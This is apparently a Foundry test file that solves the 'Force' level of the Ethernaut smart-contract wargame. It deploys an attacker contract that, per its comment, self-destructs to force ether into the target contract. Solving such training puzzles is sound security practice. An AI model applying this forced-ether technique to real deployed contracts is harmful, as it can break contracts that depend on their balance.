pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../src/levels/07_Force/ForceFactory.sol";
import "../src/levels/07_Force/ForceHack.sol";
import "../src/core/Ethernaut.sol";
import "./utils/vm.sol";
import "forge-std/console.sol";


contract ForceTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address attacker = address(100);
    

    function setUp() public {
        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        // Deal EOA address some ether
        vm.deal(attacker, 5 ether);
    }

    function testForceHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        ForceFactory forceFactory = new ForceFactory();
        ethernaut.registerLevel(forceFactory);
        // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(forceFactory);
        Force ethernautForce = Force(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create the attacking contract which will self destruct and send ether to the Force contract
        ForceHack forceHack = (new ForceHack){value: 0.1 ether}(payable(levelAddress));
 


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
